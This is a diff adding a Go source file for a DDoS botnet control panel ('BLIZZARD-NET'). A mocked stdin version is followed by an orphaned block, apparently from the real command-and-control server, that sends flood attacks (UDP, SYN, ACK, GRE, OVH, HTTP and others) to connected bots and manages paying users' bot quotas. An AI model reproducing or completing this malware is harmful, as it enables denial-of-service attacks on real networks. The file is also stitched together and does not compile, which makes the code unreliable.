@@ -1,0 +1,401 @@
+
+package main
+
+import (
+    "bufio"
+    "fmt"
+    "os"
+    "strings"
+    "strconv"
+    "time"
+)
+
+
+type Admin struct {
+    reader *bufio.Reader
+    writer *os.File
+}
+
+func NewAdmin() *Admin {
+    return &Admin{reader: bufio.NewReader(os.Stdin), writer: os.Stdout}
+}
+
+
+func (this *Admin) Handle() {
+    // Simulate login
+    fmt.Fprint(this.writer, "\033[2J\033[1;1H")
+    fmt.Fprint(this.writer, "\033[01;36mLOGIN\033[01;36m | BLIZZARD-NET\n\n")
+    fmt.Fprint(this.writer, "\033[0;96mUsername\033[37m: \033[0m")
+    username, _ := this.ReadLine(false)
+    fmt.Fprint(this.writer, "\033[0;96mPassword\033[37m: \033[0m")
+    _, _ = this.ReadLine(true)
+    fmt.Fprint(this.writer, "\n\033[01;36mChecking login.. Please wait\033[0m\n")
+    time.Sleep(1 * time.Second)
+    // Always succeed
+    userInfo := AccountInfo{admin: 1, maxBots: 100}
+
+    fmt.Fprint(this.writer, "\033[2J\033[1;1H\n")
+    printAscii(this.writer)
+
+    for {
+        var botCatagory string
+        var botCount int
+        fmt.Fprintf(this.writer, "\x1b[1;36m%s\x1b[0;37m@\x1b[1;31mBLIZZARDNET\x1b[0;37m~# \033[0m", username)
+        cmd, err := this.ReadLine(false)
+        if err != nil || cmd == "exit" || cmd == "quit" {
+            return
+        }
+        if cmd == "" {
+            continue
+        }
+        if cmd == "clear" || cmd == "cls" || cmd == "c" {
+            fmt.Fprint(this.writer, "\033[2J\033[1H\n")
+            printAscii(this.writer)
+            continue
+        }
+        if cmd == "help" || cmd == "HELP" || cmd == "?" {
+            printHelp(this.writer)
+            continue
+        }
+        if cmd == "METHODS" || cmd == "methods" {
+            printMethods(this.writer)
+            continue
+        }
+        if userInfo.admin == 1 && cmd == "admin" {
+            fmt.Fprint(this.writer, "\033[01;37m ╔-═════════════════════════════════-╗\n")
+            fmt.Fprint(this.writer, "\033[01;37m ║ \033[01;31madduser -> \033[01;37mAdd normal user  \033[01;37m║\n")
+            fmt.Fprint(this.writer, "\033[01;37m ╚-═════════════════════════════════-╝  \n")
+            continue
+        }
+        if cmd == "credits" || cmd == "CREDITS" {
+            fmt.Fprint(this.writer, "\033[01;37m ╔-═════════════════════════════════-╗\n")
+            fmt.Fprint(this.writer, "\033[01;37m ║ \033[01;31mOwner: \033[01;37mBLIZZARD-STRESSER.WTF\t      \033[01;37m║\n")
+            fmt.Fprint(this.writer, "\033[01;37m ║ \033[01;31mDeveloper: \033[01;37mRootSec\t      \033[01;37m║\n")
+            fmt.Fprint(this.writer, "\033[01;37m ╚-═════════════════════════════════-╝  \n")
+            continue
+        }
+        if cmd == "bots" || cmd == "BOTS" {
+            botCount = 42 // mock
+            m := map[string]int{"default": botCount}
+            for k, v := range m {
+                fmt.Fprintf(this.writer, "\x1b[1;31m%s: \x1b[0;36m%d\033[0m\n\033[0m", k, v)
+            }
+            fmt.Fprintf(this.writer, "\033[01;37mTotal bots: \033[01;31m[\033[01;31m%d\033[01;31m]\n\033[0m", botCount)
+            continue
+        }
+        botCount = userInfo.maxBots
+        if userInfo.admin == 1 && cmd == "adduser" {
+            fmt.Fprint(this.writer, "Enter new username: ")
+            new_un, _ := this.ReadLine(false)
+            fmt.Fprint(this.writer, "Enter new password: ")
+            new_pw, _ := this.ReadLine(false)
+            fmt.Fprint(this.writer, "Enter wanted bot count (-1 for full net): ")
+            max_bots_str, _ := this.ReadLine(false)
+            max_bots, err := strconv.Atoi(max_bots_str)
+            if err != nil {
+                fmt.Fprintf(this.writer, "\033[31;1m%s\033[0m\n", "Failed to parse the bot count")
+                continue
+            }
+            fmt.Fprint(this.writer, "Max attack duration (-1 for none): ")
+            duration_str, _ := this.ReadLine(false)
+            duration, err := strconv.Atoi(duration_str)
+            if err != nil {
+                fmt.Fprintf(this.writer, "\033[31;1m%s\033[0m\n", "Failed to parse the attack duration limit")
+                continue
+            }
+            fmt.Fprint(this.writer, "Cooldown time (0 for none): ")
+            cooldown_str, _ := this.ReadLine(false)
+            cooldown, err := strconv.Atoi(cooldown_str)
+            if err != nil {
+                fmt.Fprintf(this.writer, "\033[31;1m%s\033[0m\n", "Failed to parse the cooldown")
+                continue
+            }
+            fmt.Fprintf(this.writer, "New account info: \nUsername: %s\nPassword: %s\nBots: %s\nContinue? (y/N)", new_un, new_pw, max_bots_str)
+            confirm, _ := this.ReadLine(false)
+            if confirm != "y" {
+                continue
+            }
+            // Always succeed
+            fmt.Fprint(this.writer, "\033[32;1mUser added successfully.\033[0m\n")
+            continue
+        }
+        if strings.HasPrefix(cmd, "*") {
+            countSplit := strings.SplitN(cmd, " ", 2)
+            count := countSplit[0][1:]
+            botCount, err = strconv.Atoi(count)
+            if err != nil {
+                fmt.Fprintf(this.writer, "\033[31;1mFailed to parse botcount \"%s\"\033[0m\n", count)
+                continue
+            }
+            if userInfo.maxBots != -1 && botCount > userInfo.maxBots {
+                fmt.Fprint(this.writer, "\033[31;1mBot count to send is bigger then allowed bot maximum\033[0m\n")
+                continue
+            }
+            cmd = countSplit[1]
+        }
+        if strings.HasPrefix(cmd, "-") {
+            cataSplit := strings.SplitN(cmd, " ", 2)
+            botCatagory = cataSplit[0][1:]
+            cmd = cataSplit[1]
+        }
+        // Simulate attack command
+        if _, err := NewAttack(cmd, userInfo.admin); err != nil {
+            fmt.Fprintf(this.writer, "\033[31;1m%s\033[0m\n", err.Error())
+        } else {
+            fmt.Fprint(this.writer, "\033[32;1mAttack command accepted (simulated).\033[0m\n")
+        }
+    }
+}
+
+
+    for {
+        var botCatagory string
+        var botCount int
+        this.conn.Write([]byte("\x1b[1;36m" + username + "\x1b[0;37m@\x1b[1;31mBLIZZARDNET\x1b[0;37m~# \033[0m"))
+        cmd, err := this.ReadLine(false)
+
+        if err != nil || cmd == "exit" || cmd == "quit" {
+            return
+        }
+        if cmd == "" {
+            continue
+        }
+        
+            if cmd == "clear" || cmd == "cls" || cmd == "c" {
+                this.conn.Write([]byte("\033[2J\033[1H"))
+                this.conn.Write([]byte("\r\n"))
+                this.conn.Write([]byte("\x1b[1;36m ██████╗ ██╗     ██╗███████╗███████╗ █████╗ ██████╗ ██████╗		\x1b[0m \r\n"))
+                this.conn.Write([]byte("\x1b[0m ██╔══██╗██║     ██║╚══███╔╝╚══███╔╝██╔══██╗██╔══██╗██╔══██╗		\x1b[0m \r\n"))
+                this.conn.Write([]byte("\x1b[90m ██████╔╝██║     ██║  ███╔╝   ███╔╝ ███████║██████╔╝██║  ██║      \x1b[0m \r\n"))
+                this.conn.Write([]byte("\x1b[1;36m ██╔══██╗██║     ██║ ███╔╝   ███╔╝  ██╔══██║██╔══██╗██║  ██║		\x1b[0m \r\n"))
+                this.conn.Write([]byte("\x1b[0m ██████╔╝███████╗██║███████╗███████╗██║  ██║██║  ██║██████╔╝		\x1b[0m \r\n"))
+                this.conn.Write([]byte("\x1b[90m ╚═════╝ ╚══════╝╚═╝╚══════╝╚══════╝╚═╝  ╚═╝╚═╝  ╚═╝╚═════╝		\x1b[0m \r\n"))
+                this.conn.Write([]byte("\r\n"))
+                this.conn.Write([]byte("\r\n"))
+                continue
+            }
+        
+            if cmd == "help" || cmd == "HELP" || cmd == "?" { // display help menu
+                this.conn.Write([]byte("\033[01;37m ╔-════════════════════════════════════-╗   \033[0m \r\n"))
+                this.conn.Write([]byte("\033[01;37m ║ \033[01;36m METHODS : \033[01;37mATTACK PUSSY    \033[01;37m  ║   \033[0m \r\n"))
+                this.conn.Write([]byte("\033[01;37m ║ \033[01;36m ADMIN : \033[01;37mADD ADMIN    \033[01;37m║   \033[0m \r\n"))
+                this.conn.Write([]byte("\033[01;37m ║ \033[01;36m BOTS : \033[01;37mNUMBER BOTS    \033[01;37m   ║   \033[0m \r\n"))
+                this.conn.Write([]byte("\033[01;37m ║ \033[01;36m CREDITS : \033[01;37mCREDITS   \033[01;37m ║   \033[0m \r\n"))
+                this.conn.Write([]byte("\033[01;37m ║ \033[01;36m CLS/CLEAR : \033[01;37mCLEAR TERMINAL    \033[01;37m ║   \033[0m \r\n"))
+                this.conn.Write([]byte("\033[01;37m ╚-════════════════════════════════════-╝ \033[0m \r\n"))
+                continue
+            }
+        
+            if cmd == "METHODS" || cmd == "methods" { // display methods and how to send an attack
+                this.conn.Write([]byte("\033[01;36m     -> | BLIZZARD-NET | <- \r\n"))
+                this.conn.Write([]byte("\033[01;31m ╔-════════════════════════════════════════════-╗   \033[0m \r\n"))
+                this.conn.Write([]byte("\033[01;31m ║ \033[01;37m udp [\033[01;37mip\033[01;37m] [\033[01;37mtime\033[01;37m] dport=[\033[01;37mport\033[01;37m]\033[01;31m                ║   \033[0m \r\n"))
+                this.conn.Write([]byte("\033[01;31m ║ \033[01;37m vse [\033[01;37mip\033[01;37m] [\033[01;37mtime\033[01;37m] dport=[\033[01;37mport\033[01;37m]\033[01;31m                ║   \033[0m \r\n"))
+                this.conn.Write([]byte("\033[01;31m ║ \033[01;37m dns [\033[01;37mip\033[01;37m] [\033[01;37mtime\033[01;37m] dport=[\033[01;37mport\033[01;37m]\033[01;31m                ║   \033[0m \r\n"))
+                this.conn.Write([]byte("\033[01;31m ║ \033[01;37m syn [\033[01;37mip\033[01;37m] [\033[01;37mtime\033[01;37m] dport=[\033[01;37mport\033[01;37m]\033[01;31m                ║   \033[0m \r\n"))
+                this.conn.Write([]byte("\033[01;31m ║ \033[01;37m ack [\033[01;37mip\033[01;37m] [\033[01;37mtime\033[01;37m] dport=[\033[01;37mport\033[01;37m]\033[01;31m                ║   \033[0m \r\n"))
+                this.conn.Write([]byte("\033[01;31m ║ \033[01;37m stomp [\033[01;37mip\033[01;37m] [\033[01;37mtime\033[01;37m] dport=[\033[01;37mport\033[01;37m]\033[01;31m              ║   \033[0m \r\n"))
+                this.conn.Write([]byte("\033[01;31m ║ \033[01;37m greip [\033[01;37mip\033[01;37m] [\033[01;37mtime\033[01;37m] dport=[\033[01;37mport\033[01;37m]\033[01;31m              ║   \033[0m \r\n"))
+                this.conn.Write([]byte("\033[01;31m ║ \033[01;37m std [\033[01;37mip\033[01;37m] [\033[01;37mtime\033[01;37m] dport=[\033[01;37mport\033[01;37m] len=[\033[01;37m1400\033[01;37m]\033[01;31m║   \033[0m \r\n"))
+                this.conn.Write([]byte("\033[01;31m ║ \033[01;37m udpplain [\033[01;37mip\033[01;37m] [\033[01;37mtime\033[01;37m] dport=[\033[01;37mport\033[01;37m]\033[01;31m           ║   \033[0m \r\n"))
+                this.conn.Write([]byte("\033[01;31m ║ \033[01;37m xmas [\033[01;37mip\033[01;37m] [\033[01;37mtime\033[01;37m] dport=[\033[01;37mport\033[01;37m]\033[01;31m               ║   \033[0m \r\n"))
+                this.conn.Write([]byte("\033[01;31m ║ \033[01;37m ovh [\033[01;37mip\033[01;37m] [\033[01;37mtime\033[01;37m] dport=[\033[01;37mport\033[01;37m]\033[01;31m                ║   \033[0m \r\n"))
+                this.conn.Write([]byte("\033[01;31m ║ \033[01;37m asyn [\033[01;37mip\033[01;37m] [\033[01;37mtime\033[01;37m] dport=[\033[01;37mport\033[01;37m]\033[01;31m    		║   \033[0m \r\n"))
+                this.conn.Write([]byte("\033[01;31m ║ \033[01;37m usyn [\033[01;37mip\033[01;37m] [\033[01;37mtime\033[01;37m] dport=[\033[01;37mport\033[01;37m]\033[01;31m		║   \033[0m \r\n"))	
+                this.conn.Write([]byte("\033[01;31m ║ \033[01;37m http [\033[01;37mip\033[01;37m] [\033[01;37mtime\033[01;37m] domain=[\033[01;37mDOMAIN\033[01;37m] conns=5000\033[01;31m ║   \033[0m \r\n"))
+                this.conn.Write([]byte("\033[01;31m ╚-════════════════════════════════════════════-╝   \033[0m \r\n"))
+                continue
+            }
+        
+            if userInfo.admin == 1 && cmd == "admin" {
+                this.conn.Write([]byte("\033[01;37m ╔-═════════════════════════════════-╗\r\n"))
+                this.conn.Write([]byte("\033[01;37m ║ \033[01;31madduser -> \033[01;37mAdd normal user  \033[01;37m║\r\n"))
+                this.conn.Write([]byte("\033[01;37m ╚-═════════════════════════════════-╝  \r\n"))
+                continue
+            }
+            if cmd == "credits" || cmd == "CREDITS" {
+                this.conn.Write([]byte("\033[01;37m ╔-═════════════════════════════════-╗\r\n"))
+                this.conn.Write([]byte("\033[01;37m ║ \033[01;31mOwner: \033[01;37mBLIZZARD-STRESSER.WTF	      \033[01;37m║\r\n"))
+                this.conn.Write([]byte("\033[01;37m ║ \033[01;31mDeveloper: \033[01;37mRootSec	      \033[01;37m║\r\n"))
+                this.conn.Write([]byte("\033[01;37m ╚-═════════════════════════════════-╝  \r\n"))
+                continue
+            }
+        
+            if cmd == "bots" || cmd == "BOTS" {
+            botCount = clientList.Count()
+                m := clientList.Distribution()
+                for k, v := range m {
+                    this.conn.Write([]byte(fmt.Sprintf("\x1b[1;31m%s: \x1b[0;36m%d\033[0m\r\n\033[0m", k, v)))
+                }
+                this.conn.Write([]byte(fmt.Sprintf("\033[01;37mTotal bots: \033[01;31m[\033[01;31m%d\033[01;31m]\r\n\033[0m", botCount)))
+                continue
+            }
+            
+        botCount = userInfo.maxBots
+
+        if userInfo.admin == 1 && cmd == "adduser" {
+            this.conn.Write([]byte("Enter new username: "))
+            new_un, err := this.ReadLine(false)
+            if err != nil {
+                return
+            }
+            this.conn.Write([]byte("Enter new password: "))
+            new_pw, err := this.ReadLine(false)
+            if err != nil {
+                return
+            }
+            this.conn.Write([]byte("Enter wanted bot count (-1 for full net): "))
+            max_bots_str, err := this.ReadLine(false)
+            if err != nil {
+                return
+            }
+            max_bots, err := strconv.Atoi(max_bots_str)
+            if err != nil {
+                this.conn.Write([]byte(fmt.Sprintf("\033[31;1m%s\033[0m\r\n", "Failed to parse the bot count")))
+                continue
+            }
+            this.conn.Write([]byte("Max attack duration (-1 for none): "))
+            duration_str, err := this.ReadLine(false)
+            if err != nil {
+                return
+            }
+            duration, err := strconv.Atoi(duration_str)
+            if err != nil {
+                this.conn.Write([]byte(fmt.Sprintf("\033[31;1m%s\033[0m\r\n", "Failed to parse the attack duration limit")))
+                continue
+            }
+            this.conn.Write([]byte("Cooldown time (0 for none): "))
+            cooldown_str, err := this.ReadLine(false)
+            if err != nil {
+                return
+            }
+            cooldown, err := strconv.Atoi(cooldown_str)
+            if err != nil {
+                this.conn.Write([]byte(fmt.Sprintf("\033[31;1m%s\033[0m\r\n", "Failed to parse the cooldown")))
+                continue
+            }
+            this.conn.Write([]byte("New account info: \r\nUsername: " + new_un + "\r\nPassword: " + new_pw + "\r\nBots: " + max_bots_str + "\r\nContinue? (y/N)"))
+            confirm, err := this.ReadLine(false)
+            if err != nil {
+                return
+            }
+            if confirm != "y" {
+                continue
+            }
+            if !database.CreateUser(new_un, new_pw, max_bots, duration, cooldown) {
+                this.conn.Write([]byte(fmt.Sprintf("\033[31;1m%s\033[0m\r\n", "Failed to create new user. An unknown error occured.")))
+            } else {
+                this.conn.Write([]byte("\033[32;1mUser added successfully.\033[0m\r\n"))
+            }
+            continue
+        }
+        if cmd[0] == '*' {
+            countSplit := strings.SplitN(cmd, " ", 2)
+            count := countSplit[0][1:]
+            botCount, err = strconv.Atoi(count)
+            if err != nil {
+                this.conn.Write([]byte(fmt.Sprintf("\033[31;1mFailed to parse botcount \"%s\"\033[0m\r\n", count)))
+                continue
+            }
+            if userInfo.maxBots != -1 && botCount > userInfo.maxBots {
+                this.conn.Write([]byte(fmt.Sprintf("\033[31;1mBot count to send is bigger then allowed bot maximum\033[0m\r\n")))
+                continue
+            }
+            cmd = countSplit[1]
+        }
+        if cmd[0] == '-' {
+            cataSplit := strings.SplitN(cmd, " ", 2)
+            botCatagory = cataSplit[0][1:]
+            cmd = cataSplit[1]
+        }
+
+        atk, err := NewAttack(cmd, userInfo.admin)
+        if err != nil {
+            this.conn.Write([]byte(fmt.Sprintf("\033[31;1m%s\033[0m\r\n", err.Error())))
+        } else {
+            buf, err := atk.Build()
+            if err != nil {
+                this.conn.Write([]byte(fmt.Sprintf("\033[31;1m%s\033[0m\r\n", err.Error())))
+            } else {
+                if can, err := database.CanLaunchAttack(username, atk.Duration, cmd, botCount, 0); !can {
+                    this.conn.Write([]byte(fmt.Sprintf("\033[31;1m%s\033[0m\r\n", err.Error())))
+                } else if !database.ContainsWhitelistedTargets(atk) {
+                    clientList.QueueBuf(buf, botCount, botCatagory)
+                } else {
+                    fmt.Println("Blocked attack by " + username + " to whitelisted prefix")
+                }
+            }
+        }
+    }
+}
+
+
+func (this *Admin) ReadLine(masked bool) (string, error) {
+    if masked {
+        // No masking in terminal, just read
+        return this.reader.ReadString('\n')
+    }
+    line, err := this.reader.ReadString('\n')
+    if err != nil {
+        return "", err
+    }
+    return strings.TrimRight(line, "\r\n"), nil
+}
+
+// --- Mocks and helpers ---
+type AccountInfo struct {
+    admin   int
+    maxBots int
+}
+
+func printAscii(w *os.File) {
+    fmt.Fprint(w, "\x1b[1;36m ██████╗ ██╗     ██╗███████╗███████╗ █████╗ ██████╗ ██████╗\t\t\x1b[0m \n")
+    fmt.Fprint(w, "\x1b[0m ██╔══██╗██║     ██║╚══███╔╝╚══███╔╝██╔══██╗██╔══██╗██╔══██╗\t\t\x1b[0m \n")
+    fmt.Fprint(w, "\x1b[90m ██████╔╝██║     ██║  ███╔╝   ███╔╝ ███████║██████╔╝██║  ██║      \x1b[0m \n")
+    fmt.Fprint(w, "\x1b[1;36m ██╔══██╗██║     ██║ ███╔╝   ███╔╝  ██╔══██║██╔══██╗██║  ██║\t\t\x1b[0m \n")
+    fmt.Fprint(w, "\x1b[0m ██████╔╝███████╗██║███████╗███████╗██║  ██║██║  ██║██████╔╝\t\t\x1b[0m \n")
+    fmt.Fprint(w, "\x1b[90m ╚═════╝ ╚══════╝╚═╝╚══════╝╚══════╝╚═╝  ╚═╝╚═╝  ╚═╝╚═════╝\t\t\x1b[0m \n\n\n")
+}
+
+func printHelp(w *os.File) {
+    fmt.Fprint(w, "\033[01;37m ╔-════════════════════════════════════-╗   \033[0m \n")
+    fmt.Fprint(w, "\033[01;37m ║ \033[01;36m METHODS : \033[01;37mATTACK PUSSY    \033[01;37m  ║   \033[0m \n")
+    fmt.Fprint(w, "\033[01;37m ║ \033[01;36m ADMIN : \033[01;37mADD ADMIN    \033[01;37m║   \033[0m \n")
+    fmt.Fprint(w, "\033[01;37m ║ \033[01;36m BOTS : \033[01;37mNUMBER BOTS    \033[01;37m   ║   \033[0m \n")
+    fmt.Fprint(w, "\033[01;37m ║ \033[01;36m CREDITS : \033[01;37mCREDITS   \033[01;37m ║   \033[0m \n")
+    fmt.Fprint(w, "\033[01;37m ║ \033[01;36m CLS/CLEAR : \033[01;37mCLEAR TERMINAL    \033[01;37m ║   \033[0m \n")
+    fmt.Fprint(w, "\033[01;37m ╚-════════════════════════════════════-╝ \033[0m \n")
+}
+
+func printMethods(w *os.File) {
+    fmt.Fprint(w, "\033[01;36m     -> | BLIZZARD-NET | <- \n")
+    fmt.Fprint(w, "\033[01;31m ╔-════════════════════════════════════════════-╗   \033[0m \n")
+    fmt.Fprint(w, "\033[01;31m ║ \033[01;37m udp [\033[01;37mip\033[01;37m] [\033[01;37mtime\033[01;37m] dport=[\033[01;37mport\033[01;37m]\033[01;31m                ║   \033[0m \n")
+    fmt.Fprint(w, "\033[01;31m ║ \033[01;37m vse [\033[01;37mip\033[01;37m] [\033[01;37mtime\033[01;37m] dport=[\033[01;37mport\033[01;37m]\033[01;31m                ║   \033[0m \n")
+    fmt.Fprint(w, "\033[01;31m ║ \033[01;37m dns [\033[01;37mip\033[01;37m] [\033[01;37mtime\033[01;37m] dport=[\033[01;37mport\033[01;37m]\033[01;31m                ║   \033[0m \n")
+    fmt.Fprint(w, "\033[01;31m ║ \033[01;37m syn [\033[01;37mip\033[01;37m] [\033[01;37mtime\033[01;37m] dport=[\033[01;37mport\033[01;37m]\033[01;31m                ║   \033[0m \n")
+    fmt.Fprint(w, "\033[01;31m ║ \033[01;37m ack [\033[01;37mip\033[01;37m] [\033[01;37mtime\033[01;37m] dport=[\033[01;37mport\033[01;37m]\033[01;31m                ║   \033[0m \n")
+    fmt.Fprint(w, "\033[01;31m ║ \033[01;37m stomp [\033[01;37mip\033[01;37m] [\033[01;37mtime\033[01;37m] dport=[\033[01;37mport\033[01;37m]\033[01;31m              ║   \033[0m \n")
+    fmt.Fprint(w, "\033[01;31m ║ \033[01;37m greip [\033[01;37mip\033[01;37m] [\033[01;37mtime\033[01;37m] dport=[\033[01;37mport\033[01;37m]\033[01;31m              ║   \033[0m \n")
+    fmt.Fprint(w, "\033[01;31m ║ \033[01;37m std [\033[01;37mip\033[01;37m] [\033[01;37mtime\033[01;37m] dport=[\033[01;37mport\033[01;37m] len=[\033[01;37m1400\033[01;37m]\033[01;31m║   \033[0m \n")
+    fmt.Fprint(w, "\033[01;31m ║ \033[01;37m udpplain [\033[01;37mip\033[01;37m] [\033[01;37mtime\033[01;37m] dport=[\033[01;37mport\033[01;37m]\033[01;31m           ║   \033[0m \n")
+    fmt.Fprint(w, "\033[01;31m ║ \033[01;37m xmas [\033[01;37mip\033[01;37m] [\033[01;37mtime\033[01;37m] dport=[\033[01;37mport\033[01;37m]\033[01;31m               ║   \033[0m \n")
+    fmt.Fprint(w, "\033[01;31m ║ \033[01;37m ovh [\033[01;37mip\033[01;37m] [\033[01;37mtime\033[01;37m] dport=[\033[01;37mport\033[01;37m]\033[01;31m                ║   \033[0m \n")
+    fmt.Fprint(w, "\033[01;31m ║ \033[01;37m asyn [\033[01;37mip\033[01;37m] [\033[01;37mtime\033[01;37m] dport=[\033[01;37mport\033[01;37m]\033[01;31m    \t\t║   \033[0m \n")
+    fmt.Fprint(w, "\033[01;31m ║ \033[01;37m usyn [\033[01;37mip\033[01;37m] [\033[01;37mtime\033[01;37m] dport=[\033[01;37mport\033[01;37m]\033[01;31m\t\t║   \033[0m \n")
+    fmt.Fprint(w, "\033[01;31m ║ \033[01;37m http [\033[01;37mip\033[01;37m] [\033[01;37mtime\033[01;37m] domain=[\033[01;37mDOMAIN\033[01;37m] conns=5000\033[01;31m ║   \033[0m \n")
+    fmt.Fprint(w, "\033[01;31m ╚-════════════════════════════════════════════-╝   \033[0m \n")
+}
+
+func NewAttack(cmd string, admin int) (*struct{}, error) {
+    // Accept any command for testing
+    if cmd == "fail" {
+        return nil, fmt.Errorf("Simulated attack error")
+    }
+    return &struct{}{}, nil
+}
+
+func main() {
+    admin := NewAdmin()
+    admin.Handle()
+}
